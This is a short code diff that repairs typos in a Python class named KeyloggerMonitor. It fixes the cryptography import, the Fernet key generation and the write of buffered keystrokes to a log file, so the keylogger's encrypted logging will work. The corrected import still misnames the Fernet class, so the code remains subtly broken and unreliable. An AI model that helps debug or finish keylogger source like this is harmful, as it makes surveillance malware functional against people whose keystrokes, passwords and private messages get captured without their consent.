@@ -12,7 +12,7 @@ import time
 from datetime import datetime
 import hashlib
 import json
-from cryptographyl.fernet import fernet
+from cryptography.fernet import fernet
 
 class KeyloggerMonitor:
     """
@@ -32,7 +32,7 @@ class KeyloggerMonitor:
 
         #Encryption setup
         if encrypt_logs:
-            self.encryption_key = Fermet.generate_key()
+            self.encryption_key = Fernet.generate_key()
             self.cipher = Fernet(self.encryption_key)
             print(f"[*] Encryption key: {self.encryption_key.decode()}")
 
@@ -91,7 +91,7 @@ class KeyloggerMonitor:
 
             
             with open(self.log_file, 'ab') as f:
-                f.write(write-data)
+                f.write(write_data)
 
             self.keystroke_buffer.clear()
 
